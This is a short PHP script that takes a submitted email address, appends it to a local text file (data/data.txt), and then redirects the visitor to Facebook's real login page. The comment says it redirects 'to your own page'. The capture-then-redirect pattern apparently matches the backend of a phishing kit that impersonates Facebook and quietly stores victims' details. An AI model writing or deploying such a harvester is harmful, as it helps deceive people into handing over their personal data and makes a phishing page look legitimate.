<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    if (!empty($_POST["email"])) {

        $email = trim($_POST["email"]);

        // Basic validation
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {

            $file = fopen("data/data.txt", "a");

            if ($file) {
                fwrite($file, $email . PHP_EOL);
                fclose($file);
            }

            // Redirect to your own page
            header("Location: https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzY2NTE2ODU5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next");
            exit;
        }
    }
}
?>
